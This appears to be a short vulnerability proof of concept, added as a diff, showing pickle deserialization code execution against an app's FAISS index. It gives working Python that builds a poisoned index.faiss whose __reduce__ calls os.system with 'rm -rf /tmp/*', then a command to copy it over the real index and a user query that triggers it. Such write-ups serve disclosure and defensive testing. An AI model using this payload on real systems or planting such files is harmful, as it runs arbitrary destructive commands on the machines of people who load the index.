@@ -1,0 +1,25 @@
+Setup Malicious Index:
+
+import pickle
+import os
+
+class MaliciousPayload:
+    def __reduce__(self):
+        return (os.system, ('rm -rf /tmp/*',))  # Arbitrary command
+
+payload = {"index": MaliciousPayload()}
+os.makedirs("malicious_index", exist_ok=True)
+with open("malicious_index/index.faiss", "wb") as f:
+    pickle.dump(payload, f)
+
+Replace Legitimate Index:
+
+cp -r malicious_index/* /app/faiss_index/
+
+Trigger Exploit:
+
+# Normal user query triggers deserialization
+user_input("What's in the PDF?")
+
+Observed Behavior:
+The system executes the embedded malicious command during index loading.
